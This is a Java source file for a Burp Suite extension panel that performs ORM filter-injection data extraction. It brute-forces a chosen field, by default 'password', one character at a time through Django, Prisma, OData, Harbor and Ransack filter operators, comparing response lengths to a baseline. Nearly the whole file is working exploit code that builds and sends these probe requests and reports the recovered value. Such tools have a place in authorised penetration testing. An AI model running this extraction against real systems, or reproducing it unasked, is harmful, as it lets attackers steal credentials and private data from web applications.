package top10.ui;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import top10.payloads.PayloadStore;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.List;

/**
 * Manual ORM field extraction tool panel.
 * <p>
 * Allows the user to extract field values character-by-character by exploiting
 * ORM filter operators (Django startsWith, Prisma JSON operators, OData filters,
 * Harbor queries, Ransack predicates). The extraction runs in a background
 * {@link SwingWorker} so the Burp UI stays responsive.
 */
public class OrmExtractorPanel extends JPanel {

    private static final String[] ORM_TYPES = {
            "Auto-Detect", "Django/Beego", "Prisma", "OData", "Harbor", "Ransack"
    };

    private static final String[] EXTRACTION_METHODS = {
            "startsWith", "regex", "gt/lt binary search", "contains (time-based)"
    };

    private static final String DEFAULT_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789";

    // -- Form fields --
    private final JTextField targetUrl;
    private final JTextField paramName;
    private final JTextField targetField;
    private final JComboBox<String> ormType;
    private final JTextField charset;
    private final JComboBox<String> method;

    // -- Buttons --
    private final JButton extractBtn;
    private final JButton stopBtn;
    private final JButton clearBtn;

    // -- Output --
    private final JTextArea outputArea;
    private final JLabel statusBar;

    // -- State --
    private final MontoyaApi api;
    private volatile SwingWorker<String, String> worker;

    public OrmExtractorPanel(MontoyaApi api, PayloadStore payloadStore) {
        this.api = api;

        setLayout(new BorderLayout(0, 6));
        setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // =====================================================================
        // Top form section (GridBagLayout)
        // =====================================================================
        JPanel formPanel = new JPanel(new GridBagLayout());
        formPanel.setBorder(BorderFactory.createTitledBorder("Extraction Configuration"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(4, 6, 4, 6);
        gbc.anchor = GridBagConstraints.WEST;

        int row = 0;

        // Target URL
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Target URL:"), gbc);
        targetUrl = new JTextField(50);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 1.0; gbc.gridwidth = 3;
        formPanel.add(targetUrl, gbc);
        gbc.gridwidth = 1;

        // Parameter Name
        row++;
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Parameter Name:"), gbc);
        paramName = new JTextField(20);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.5;
        formPanel.add(paramName, gbc);

        // Target Field
        gbc.gridx = 2; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Target Field:"), gbc);
        targetField = new JTextField("password", 15);
        gbc.gridx = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.5;
        formPanel.add(targetField, gbc);

        // ORM Type
        row++;
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("ORM Type:"), gbc);
        ormType = new JComboBox<>(ORM_TYPES);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.5;
        formPanel.add(ormType, gbc);

        // Extraction Method
        gbc.gridx = 2; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Extraction Method:"), gbc);
        method = new JComboBox<>(EXTRACTION_METHODS);
        gbc.gridx = 3; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 0.5;
        formPanel.add(method, gbc);

        // Charset
        row++;
        gbc.gridx = 0; gbc.gridy = row; gbc.fill = GridBagConstraints.NONE; gbc.weightx = 0;
        formPanel.add(new JLabel("Charset:"), gbc);
        charset = new JTextField(DEFAULT_CHARSET, 40);
        gbc.gridx = 1; gbc.fill = GridBagConstraints.HORIZONTAL; gbc.weightx = 1.0; gbc.gridwidth = 3;
        formPanel.add(charset, gbc);
        gbc.gridwidth = 1;

        // Buttons
        row++;
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 8, 0));
        extractBtn = new JButton("Extract");
        stopBtn = new JButton("Stop");
        clearBtn = new JButton("Clear");
        stopBtn.setEnabled(false);
        buttonPanel.add(extractBtn);
        buttonPanel.add(stopBtn);
        buttonPanel.add(clearBtn);

        gbc.gridx = 0; gbc.gridy = row; gbc.gridwidth = 4; gbc.fill = GridBagConstraints.NONE;
        gbc.weightx = 0; gbc.anchor = GridBagConstraints.WEST;
        formPanel.add(buttonPanel, gbc);

        add(formPanel, BorderLayout.NORTH);

        // =====================================================================
        // Middle output section
        // =====================================================================
        JPanel outputPanel = new JPanel(new BorderLayout(0, 4));
        outputPanel.setBorder(BorderFactory.createTitledBorder("Extraction Progress"));

        outputArea = new JTextArea(18, 80);
        outputArea.setEditable(false);
        outputArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 13));
        JScrollPane scrollPane = new JScrollPane(outputArea);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        outputPanel.add(scrollPane, BorderLayout.CENTER);

        add(outputPanel, BorderLayout.CENTER);

        // =====================================================================
        // Bottom status section
        // =====================================================================
        statusBar = new JLabel("Ready");
        statusBar.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(1, 0, 0, 0, Color.GRAY),
                BorderFactory.createEmptyBorder(4, 6, 4, 6)
        ));
        add(statusBar, BorderLayout.SOUTH);

        // =====================================================================
        // Action listeners
        // =====================================================================
        extractBtn.addActionListener(this::onExtract);
        stopBtn.addActionListener(e -> onStop());
        clearBtn.addActionListener(e -> onClear());
    }

    // =========================================================================
    // Extract action
    // =========================================================================

    private void onExtract(ActionEvent e) {
        String url = targetUrl.getText().trim();
        String param = paramName.getText().trim();
        String field = targetField.getText().trim();
        String selectedOrm = (String) ormType.getSelectedItem();
        String chars = charset.getText().trim();
        String selectedMethod = (String) method.getSelectedItem();

        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Target URL is required.", "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }
        if (param.isEmpty() && !"Prisma".equals(selectedOrm)) {
            JOptionPane.showMessageDialog(this, "Parameter Name is required for this ORM type.", "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }
        if (field.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Target Field is required.", "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }
        if (chars.isEmpty()) {
            JOptionPane.showMessageDialog(this, "Charset must not be empty.", "Validation Error", JOptionPane.WARNING_MESSAGE);
            return;
        }

        extractBtn.setEnabled(false);
        stopBtn.setEnabled(true);
        outputArea.append("Starting extraction...\n");
        outputArea.append("  URL   : " + url + "\n");
        outputArea.append("  ORM   : " + selectedOrm + "\n");
        outputArea.append("  Method: " + selectedMethod + "\n");
        outputArea.append("  Field : " + field + "\n\n");

        worker = new SwingWorker<String, String>() {

            private int requestCount = 0;
            private long startTime;

            @Override
            protected String doInBackground() {
                startTime = System.currentTimeMillis();
                StringBuilder extracted = new StringBuilder();

                try {
                    // ---- Establish a "no match" baseline ----
                    int baselineLength = getBaselineLength(url, param, field, selectedOrm, "ZZZZNOTEXIST999");

                    publish("[Baseline] No-match response length: " + baselineLength + " bytes\n");

                    boolean found = true;
                    while (found && !isCancelled()) {
                        found = false;

                        for (int i = 0; i < chars.length(); i++) {
                            if (isCancelled()) {
                                return extracted.toString();
                            }

                            char testChar = chars.charAt(i);
                            String probe = extracted.toString() + testChar;

                            updateStatus("Requests: " + requestCount + " | Elapsed: "
                                    + elapsedSeconds() + "s | Current: testing '"
                                    + testChar + "' at position " + (extracted.length() + 1));

                            int probeLength = sendProbe(url, param, field, selectedOrm, probe);

                            if (probeLength != baselineLength) {
                                extracted.append(testChar);
                                publish("Extracting: " + extracted + "\n");
                                found = true;
                                break;
                            }
                        }
                    }

                    if (isCancelled()) {
                        publish("\n[Cancelled] Partial extraction: " + extracted + "\n");
                    }

                } catch (Exception ex) {
                    publish("\n[Error] " + ex.getClass().getSimpleName() + ": " + ex.getMessage() + "\n");
                }

                return extracted.toString();
            }

            /**
             * Get the response length for a "known-no-match" probe to use as the baseline.
             */
            private int getBaselineLength(String url, String param, String field,
                                          String orm, String value) {
                return sendProbe(url, param, field, orm, value);
            }

            /**
             * Send a single extraction probe and return the response body length.
             */
            private int sendProbe(String baseUrl, String param, String field,
                                  String orm, String probeValue) {
                requestCount++;
                try {
                    HttpRequest request = buildProbeRequest(baseUrl, param, field, orm, probeValue);
                    HttpRequestResponse response = api.http().sendRequest(request);

                    if (response == null || response.response() == null) {
                        return -1;
                    }
                    return response.response().bodyToString().length();
                } catch (Exception ex) {
                    publish("[Request error] " + ex.getMessage() + "\n");
                    return -1;
                }
            }

            /**
             * Build the HTTP request appropriate for the selected ORM type.
             */
            private HttpRequest buildProbeRequest(String baseUrl, String param,
                                                  String field, String orm, String probeValue) {
                switch (orm) {
                    case "Prisma":
                        return buildPrismaRequest(baseUrl, field, probeValue);
                    case "OData":
                        return buildODataRequest(baseUrl, field, probeValue);
                    case "Harbor":
                        return buildHarborRequest(baseUrl, field, probeValue);
                    case "Ransack":
                        return buildRansackRequest(baseUrl, field, probeValue);
                    case "Django/Beego":
                        return buildDjangoRequest(baseUrl, param, field, probeValue);
                    case "Auto-Detect":
                    default:
                        // Default to Django-style for Auto-Detect
                        return buildDjangoRequest(baseUrl, param, field, probeValue);
                }
            }

            private HttpRequest buildDjangoRequest(String baseUrl, String param,
                                                   String field, String probeValue) {
                // field__startswith=probeValue sent as a URL parameter
                String filterParam = field + "__startswith";
                return HttpRequest.httpRequestFromUrl(baseUrl)
                        .withParameter(HttpParameter.urlParameter(filterParam, probeValue));
            }

            private HttpRequest buildPrismaRequest(String baseUrl, String field, String probeValue) {
                // JSON body: {"field":{"startsWith":"probeValue"}}
                String jsonBody = "{\"" + escapeJson(field) + "\":{\"startsWith\":\""
                        + escapeJson(probeValue) + "\"}}";
                return HttpRequest.httpRequestFromUrl(baseUrl)
                        .withBody(jsonBody)
                        .withAddedHeader("Content-Type", "application/json");
            }

            private HttpRequest buildODataRequest(String baseUrl, String field, String probeValue) {
                // $filter=startswith(field,'probeValue')
                String filterValue = "startswith(" + field + ",'" + probeValue + "')";
                return HttpRequest.httpRequestFromUrl(baseUrl)
                        .withParameter(HttpParameter.urlParameter("$filter", filterValue));
            }

            private HttpRequest buildHarborRequest(String baseUrl, String field, String probeValue) {
                // q=field=~^probeValue
                String filterValue = field + "=~^" + probeValue;
                return HttpRequest.httpRequestFromUrl(baseUrl)
                        .withParameter(HttpParameter.urlParameter("q", filterValue));
            }

            private HttpRequest buildRansackRequest(String baseUrl, String field, String probeValue) {
                // q[field_start]=probeValue
                String filterParam = "q[" + field + "_start]";
                return HttpRequest.httpRequestFromUrl(baseUrl)
                        .withParameter(HttpParameter.urlParameter(filterParam, probeValue));
            }

            private String elapsedSeconds() {
                return String.valueOf((System.currentTimeMillis() - startTime) / 1000);
            }

            private void updateStatus(String message) {
                SwingUtilities.invokeLater(() -> statusBar.setText(message));
            }

            @Override
            protected void process(List<String> chunks) {
                for (String chunk : chunks) {
                    outputArea.append(chunk);
                }
                // Auto-scroll to bottom
                outputArea.setCaretPosition(outputArea.getDocument().getLength());
            }

            @Override
            protected void done() {
                extractBtn.setEnabled(true);
                stopBtn.setEnabled(false);
                try {
                    if (isCancelled()) {
                        statusBar.setText("Extraction cancelled. Requests: " + requestCount);
                        outputArea.append("\n--- Extraction cancelled ---\n");
                    } else {
                        String result = get();
                        statusBar.setText("Extraction complete. Requests: " + requestCount
                                + " | Elapsed: " + elapsedSeconds() + "s");
                        outputArea.append("\n--- Extraction complete ---\n");
                        outputArea.append("Result: " + (result.isEmpty() ? "(empty)" : result) + "\n");
                    }
                } catch (Exception ex) {
                    statusBar.setText("Extraction failed: " + ex.getMessage());
                    outputArea.append("\n[Error] " + ex.getMessage() + "\n");
                }
                outputArea.setCaretPosition(outputArea.getDocument().getLength());
            }
        };

        worker.execute();
    }

    // =========================================================================
    // Stop action
    // =========================================================================

    private void onStop() {
        SwingWorker<String, String> w = worker;
        if (w != null && !w.isDone()) {
            w.cancel(true);
        }
    }

    // =========================================================================
    // Clear action
    // =========================================================================

    private void onClear() {
        outputArea.setText("");
        statusBar.setText("Ready");
    }

    // =========================================================================
    // Helpers
    // =========================================================================

    /**
     * Minimal JSON string escaping for safe inclusion in JSON values.
     */
    private static String escapeJson(String input) {
        if (input == null) {
            return "";
        }
        return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
